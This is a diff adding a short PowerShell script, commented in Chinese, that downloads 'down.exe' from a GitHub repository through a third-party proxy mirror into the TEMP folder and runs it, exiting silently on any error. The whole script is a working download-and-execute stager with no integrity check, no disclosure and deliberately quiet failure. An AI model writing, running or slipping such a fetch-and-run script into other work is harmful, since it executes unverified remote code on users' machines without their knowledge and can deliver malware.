@@ -1,0 +1,18 @@
+# 1. 定义原始文件地址和加速站前缀
+$原始链接 = "https://raw.githubusercontent.com/royckk/RE/main/down.exe"
+$加速站前缀 = "https://g.110777.xyz/"
+$加速链接 = $加速站前缀 + $原始链接
+$本地路径 = "$env:TEMP\down.exe"
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $加速链接 -OutFile $本地路径 -UseBasicParsing -ErrorAction Stop
+} catch {
+    # 发生错误时静默退出
+    exit 1
+}
+try {
+    & $本地路径
+    exit 0
+} catch {
+    exit 1
+}
